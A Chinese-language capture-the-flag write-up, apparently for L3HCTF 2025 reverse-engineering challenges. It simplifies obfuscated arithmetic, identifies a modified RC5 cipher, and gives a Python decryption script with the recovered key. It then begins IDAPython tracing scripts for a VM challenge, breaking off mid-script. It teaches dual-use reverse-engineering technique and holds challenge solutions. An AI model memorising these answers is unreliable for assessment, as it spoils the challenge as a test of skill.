<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( unk_B1C8 &lt; <span class="number">10</span> &amp;&amp; unk_B1C8 &gt;= <span class="number">10</span> )    // 恒假</span><br><span class="line">    goto LABEL_26;</span><br><span class="line"><span class="keyword">if</span> ( unk_B218 &gt;= <span class="number">10</span> || unk_B218 &lt; <span class="number">10</span> )    // 恒真</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>减1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*v37 - <span class="number">1067854539</span> + <span class="number">1067854538</span>    // 等价于*v37 - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*v24 &amp; <span class="number">0xAE4094B7</span> | ~*v24 &amp; <span class="number">0x51BF6B48</span>    // 等价于*v24^<span class="number">0x51BF6B48</span></span><br></pre></td></tr></table></figure>

<p>偶数次异或相同值不变</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*v24 &amp; <span class="number">0xAE4094B7</span> | ~*v24 &amp; <span class="number">0x51BF6B48</span>) ^ (*v23 &amp; <span class="number">0xAE4094B7</span> | ~*v23 &amp; <span class="number">0x51BF6B48</span>)    // 等价于*v24^*v23</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v9 ^ v8 | v9 &amp; v8    <span class="comment">// 等价于v9|v8</span></span><br></pre></td></tr></table></figure>

<p>最后可以得到两份干净简洁的伪代码交给gemini分析下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_555555555250</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v41 = a1;</span><br><span class="line">  v42 = a2;</span><br><span class="line">        v2 = <span class="built_in">HIDWORD</span>(v42);</span><br><span class="line">        v32 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v33 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v34 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v35 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v36 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v37 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v38 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v39 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        v40 = &amp;v27 - <span class="number">2</span>;</span><br><span class="line">        *(&amp;v27 - <span class="number">2</span>) = v41;</span><br><span class="line">        <span class="built_in">HIDWORD</span>(v27) = v2;</span><br><span class="line">        <span class="built_in">LODWORD</span>(v27) = <span class="number">0</span>;</span><br><span class="line">LABEL_3:</span><br><span class="line">  v31 = *v37 &lt; <span class="number">4u</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v31 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = v38;</span><br><span class="line">    *(v34 + *v37) = <span class="number">0</span>;</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v38 &gt;= <span class="number">4u</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++*v37;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">      &#125;</span><br><span class="line">      *(v34 + *v37) = *(*v33 + (*v38 + <span class="number">4</span> * *v37)) + (*(v34 + *v37) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">      ++*v38;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v37;</span><br><span class="line">  **v32 = <span class="number">0xB7E15163</span>;</span><br><span class="line">  *v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v37 &gt;= <span class="number">0x1Au</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(*v32 + <span class="number">4LL</span> * *v37) = *(*v32 + <span class="number">4LL</span> * (*v37 - <span class="number">1</span>)) - <span class="number">0x61C88647</span>;</span><br><span class="line">    ++*v37;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v35;</span><br><span class="line">  v8 = v36;</span><br><span class="line">  v9 = v37;</span><br><span class="line">  *v38 = <span class="number">0</span>;</span><br><span class="line">  *v9 = <span class="number">0</span>;</span><br><span class="line">  *v8 = <span class="number">0</span>;</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  *v39 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *v39 &lt; <span class="number">78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = v38;</span><br><span class="line">      v11 = v36;</span><br><span class="line">      v12 = v34;</span><br><span class="line">      v13 = v35;</span><br><span class="line">      v15 = ((*v35 + *(*v32 + <span class="number">4LL</span> * *v37) + *v36) &gt;&gt; <span class="number">29</span>) | ((*v35 + *(*v32 + <span class="number">4LL</span> * *v37) + *v36) &lt;&lt; <span class="number">3</span>);</span><br><span class="line">      *(*v32 + <span class="number">4LL</span> * *v37) = v15;</span><br><span class="line">      *v13 = v15;</span><br><span class="line">      v18 = v37;</span><br><span class="line">      v19 = ((*v11 + *v35 + *(v12 + *v10)) &gt;&gt; ((*v11 + *v35) + <span class="number">32</span>)) | ((*v13 + *(v12 + *v10) + *v11) &lt;&lt; (*v13 + *v11));</span><br><span class="line">      *(v12 + *v10) = v19;</span><br><span class="line">      *v11 = v19;</span><br><span class="line">      v20 = v38;</span><br><span class="line">      *v18 = (*v18 + <span class="number">1</span>) % <span class="number">0x1A</span>;</span><br><span class="line">      *v20 = (*v20 + <span class="number">1</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      ++*v39;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> *__fastcall <span class="title">sub_555555555E80</span><span class="params">(_DWORD *a1, __int64 a2, _DWORD *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &quot;+&quot; TO EXPAND]</span></span><br><span class="line"></span><br><span class="line">  v26 = a1;</span><br><span class="line">  v27 = a2;</span><br><span class="line">  v28 = a3;</span><br><span class="line">    v3 = v28;</span><br><span class="line">    v22 = &amp;v21 - <span class="number">2</span>;</span><br><span class="line">    v23 = (&amp;v21 - <span class="number">2</span>);</span><br><span class="line">    v24 = &amp;v21 - <span class="number">2</span>;</span><br><span class="line">    v25 = &amp;v21 - <span class="number">2</span>;</span><br><span class="line">    *(&amp;v21 - <span class="number">2</span>) = v26;</span><br><span class="line">    v21 = v3;</span><br><span class="line">    <span class="built_in">LODWORD</span>(v21) = **(&amp;v21 - <span class="number">2</span>) + *v3;</span><br><span class="line">    *(&amp;v21 - <span class="number">4</span>) = (*(&amp;v21 - <span class="number">2</span>))[<span class="number">1</span>] + v21[<span class="number">1</span>];</span><br><span class="line">    *(&amp;v21 - <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v25 &lt;= <span class="number">0xCu</span> )</span><br><span class="line">  &#123;</span><br><span class="line">      *v23 = *(*v21 + <span class="number">4LL</span> * (<span class="number">2</span> * *v25)) + (((*v24 ^ *v23) &lt;&lt; *v24) | ((*v24 ^ *v23) &gt;&gt; (<span class="number">32</span> - *v24)));</span><br><span class="line">      *v24 = (((*v23 ^ *v24) &gt;&gt; (<span class="number">32</span> - *v23)) | ((*v23 ^ *v24) &lt;&lt; *v23)) + *(*v21 + <span class="number">4LL</span> * (<span class="number">2</span> * *v25 + <span class="number">1</span>));</span><br><span class="line">      *v23 = *v24 ^ *v23;</span><br><span class="line">    ++*v25;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = v22;</span><br><span class="line">  v12 = v24;</span><br><span class="line">  **v22 = *v23;</span><br><span class="line">  result = *v11;</span><br><span class="line">  result[<span class="number">1</span>] = *v12;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析可知是RC5的密钥扩展和加密函数，其中加密函数地方做了魔改，对在轮加密种A多异或了B，解密脚本如下</p>
<p>还有个很坑的点卡了很久，密钥是<code>cleWtemoH3Lo!FTC</code>，而不是 WelcometoL3HCTF! ，正好是后者小端存储形式的字符串（需要动调去密钥扩展里看从内存里读取的到底是什么值）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RC5</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.w = <span class="number">32</span>  <span class="comment"># 字长（比特）</span></span><br><span class="line">        <span class="variable language_">self</span>.r = <span class="number">12</span>  <span class="comment"># 轮数</span></span><br><span class="line">        <span class="variable language_">self</span>.b = <span class="built_in">len</span>(key)  <span class="comment"># 密钥长度</span></span><br><span class="line">        <span class="variable language_">self</span>.t = <span class="number">2</span> * (<span class="variable language_">self</span>.r + <span class="number">1</span>)  <span class="comment"># 密钥表大小</span></span><br><span class="line">        <span class="variable language_">self</span>.mod = <span class="number">1</span> &lt;&lt; <span class="variable language_">self</span>.w  <span class="comment"># 模数</span></span><br><span class="line">        <span class="variable language_">self</span>.S = <span class="variable language_">self</span>._expand_key(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_expand_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">        <span class="comment"># 初始化常量</span></span><br><span class="line">        P, Q = <span class="number">0xB7E15163</span>, <span class="number">0x61C88647</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 初始化密钥表</span></span><br><span class="line">        S = [P]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="variable language_">self</span>.t):</span><br><span class="line">            S.append((S[i - <span class="number">1</span>] - Q) % <span class="variable language_">self</span>.mod)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将密钥转换为字列表</span></span><br><span class="line">        c = <span class="built_in">max</span>(<span class="built_in">len</span>(key) // <span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line">        L = [<span class="number">0</span>] * c</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">            idx = i // <span class="number">4</span></span><br><span class="line">            shift = <span class="number">8</span> * (i % <span class="number">4</span>)</span><br><span class="line">            L[idx] = (L[idx] + (key[i] &lt;&lt; shift)) % <span class="variable language_">self</span>.mod</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 混合密钥</span></span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        A = B = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span> * <span class="built_in">max</span>(<span class="variable language_">self</span>.t, c)):</span><br><span class="line">            A = S[i] = <span class="variable language_">self</span>.rotl((S[i] + A + B) % <span class="variable language_">self</span>.mod, <span class="number">3</span>)</span><br><span class="line">            B = L[j] = <span class="variable language_">self</span>.rotl((L[j] + A + B) % <span class="variable language_">self</span>.mod, (A + B) % <span class="variable language_">self</span>.w)</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="variable language_">self</span>.t</span><br><span class="line">            j = (j + <span class="number">1</span>) % c</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rotl</span>(<span class="params">self, x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n %= <span class="variable language_">self</span>.w</span><br><span class="line">        <span class="keyword">return</span> ((x &lt;&lt; n) | (x &gt;&gt; (<span class="variable language_">self</span>.w - n))) % <span class="variable language_">self</span>.mod</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rotr</span>(<span class="params">self, x: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        n %= <span class="variable language_">self</span>.w</span><br><span class="line">        <span class="keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="variable language_">self</span>.w - n))) % <span class="variable language_">self</span>.mod</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">self, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># 解析输入块</span></span><br><span class="line">        A = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, data[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        B = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, data[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解密过程</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="variable language_">self</span>.r, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            A = A ^ B</span><br><span class="line">            B = <span class="variable language_">self</span>.rotr((B - <span class="variable language_">self</span>.S[<span class="number">2</span> * i + <span class="number">1</span>]) % <span class="variable language_">self</span>.mod, A) ^ A</span><br><span class="line">            A = <span class="variable language_">self</span>.rotr((A - <span class="variable language_">self</span>.S[<span class="number">2</span> * i]) % <span class="variable language_">self</span>.mod, B) ^ B</span><br><span class="line"></span><br><span class="line">        B = (B - <span class="variable language_">self</span>.S[<span class="number">1</span>]) % <span class="variable language_">self</span>.mod</span><br><span class="line">        A = (A - <span class="variable language_">self</span>.S[<span class="number">0</span>]) % <span class="variable language_">self</span>.mod</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打包输出</span></span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, A, B)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">self, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;加密一个64位数据块&quot;&quot;&quot;</span></span><br><span class="line">        A = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, data[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        B = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, data[<span class="number">4</span>:<span class="number">8</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 初始白化</span></span><br><span class="line">        A = (A + <span class="variable language_">self</span>.S[<span class="number">0</span>]) % <span class="variable language_">self</span>.mod</span><br><span class="line">        B = (B + <span class="variable language_">self</span>.S[<span class="number">1</span>]) % <span class="variable language_">self</span>.mod</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 轮函数</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="variable language_">self</span>.r + <span class="number">1</span>):</span><br><span class="line">            A = (<span class="variable language_">self</span>.rotl((A ^ B), B) + <span class="variable language_">self</span>.S[<span class="number">2</span> * i]) % <span class="variable language_">self</span>.mod</span><br><span class="line">            B = (<span class="variable language_">self</span>.rotl((B ^ A), A) + <span class="variable language_">self</span>.S[<span class="number">2</span> * i + <span class="number">1</span>]) % <span class="variable language_">self</span>.mod</span><br><span class="line">            A ^= B</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, A, B)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;加密任意长度数据&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 分块加密</span></span><br><span class="line">        blocks = [plaintext[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plaintext), <span class="number">8</span>)]</span><br><span class="line">        ciphertext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">            ciphertext += <span class="variable language_">self</span>.encrypt_block(block)</span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># 处理填充（示例使用PKCS#7）</span></span><br><span class="line">        blocks = [ciphertext[i:i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">8</span>)]</span><br><span class="line">        plaintext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">            plaintext += <span class="variable language_">self</span>.decrypt_block(block)</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&quot;cleWtemoH3Lo!FTC&quot;</span></span><br><span class="line">    rc5 = RC5(key)</span><br><span class="line">    plainttext = <span class="string">b&quot;flag&#123;11111222222333333333333334&#125;&quot;</span></span><br><span class="line">    ciphertext = rc5.encrypt(plainttext)</span><br><span class="line">    <span class="built_in">print</span>(ciphertext.<span class="built_in">hex</span>())</span><br><span class="line">    ciphertext = <span class="built_in">bytes</span>([<span class="number">0x1B</span>, <span class="number">0xBB</span>, <span class="number">0xA1</span>, <span class="number">0xF2</span>, <span class="number">0xE9</span>, <span class="number">0x7C</span>, <span class="number">0x87</span>, <span class="number">0x21</span>, <span class="number">0x8A</span>, <span class="number">0x37</span>, <span class="number">0xFD</span>, <span class="number">0x0A</span>, <span class="number">0x94</span>, <span class="number">0x1A</span>, <span class="number">0x81</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x1E</span>, <span class="number">0xE3</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x2E</span>, <span class="number">0xD8</span>, <span class="number">0x3F</span>, <span class="number">0x84</span>, <span class="number">0xB8</span>, <span class="number">0x71</span>, <span class="number">0x42</span>, <span class="number">0xCC</span>, <span class="number">0x35</span>, <span class="number">0x8B</span>, <span class="number">0x39</span>])</span><br><span class="line"></span><br><span class="line">    plaintext = rc5.decrypt(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2><span id="easyvm">easyvm</span><a href="#easyvm" class="header-anchor"></a></h2><p>调试可以发现是类tea加密，8字节一组变化</p>
<p>最开始做复杂了一点点去分析VM里每个指令的作用并试图模拟，最后才想到直接ida下条件断点在重要运算指令上即可，把两个操作数打印下就知道每一步计算都做了什么</p>
<p>找到vm计算指令的位置（tea中主要为add、sub、xor、shl、shr），简单写下idapython脚本，以此来模拟trace获得加密log</p>
<p><img src="../images/2025-L3HCTF/bb28e8da-4dc7-47cf-8b32-8592c4b3a480.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc, idaapi</span><br><span class="line">op1_val = idc.get_reg_value(<span class="string">&quot;EDX&quot;</span>)</span><br><span class="line">op2_val = idc.get_reg_value(<span class="string">&quot;ECX&quot;</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">result_val = idc.get_reg_value(<span class="string">&quot;EDX&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shl <span class="subst">&#123;<span class="built_in">hex</span>(op1_val)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(op2_val)&#125;</span> = <span class="subst">&#123;<span class="built_in">hex</span>((op1_val&lt;&lt;op2_val)&amp;<span class="number">0xffffffff</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc, idaapi</span><br><span class="line">op1_val = idc.get_reg_value(<span class="string">&quot;EDX&quot;</span>)</span><br><span class="line">op2_val = idc.get_reg_value(<span class="string">&quot;ECX&quot;</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shr <span class="subst">&#123;<span class="built_in">hex</span>(op1_val)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(op2_val)&#125;</span> = <span class="subst">&#123;<span class="built_in">hex</span>((op1_val&gt;&gt;op2_val)&amp;<span class="number">0xffffffff</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc, idaapi</span><br><span class="line">op1_val = idc.get_reg_value(<span class="string">&quot;EAX&quot;</span>)</span><br><span class="line">rbp_val = idc.get_reg_value(<span class="string">&quot;RBP&quot;</span>)</span><br><span class="line">mem_addr = rbp_val + <span class="number">0x4C</span></span><br><span class="line">op2_val = idc.get_wide_dword(mem_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;xor <span class="subst">&#123;<span class="built_in">hex</span>(op1_val)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(op2_val)&#125;</span> = <span class="subst">&#123;<span class="built_in">hex</span>((op1_val^op2_val)&amp;<span class="number">0xffffffff</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc, idaapi</span><br><span class="line">op1_val = idc.get_reg_value(<span class="string">&quot;EAX&quot;</span>)</span><br><span class="line">rbp_val = idc.get_reg_value(<span class="string">&quot;RBP&quot;</span>)</span><br><span class="line">mem_addr = rbp_val + <span class="number">0x1C</span></span><br><span class="line">op2_val = idc.get_wide_dword(mem_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;sub <span class="subst">&#123;<span class="built_in">hex</span>(op1_val)&#125;</span>, <span class="subst">&#123;<span class="built_in">hex</span>(op2_val)&#125;</span> = <span class="subst">&#123;<span class="built_in">hex</span>((op1_val-op2_val)&amp;<span class="number">0xffffffff</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc, idaapi</span><br><span class="line">op1_val = idc.get_reg_value(<span class="string">&quot;EAX&quot;</span>)</span><br><span class="line">op2_val = idc.get_reg_value(<span class="string">&quot;EDX&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;add <span class="subst">&#123;<span 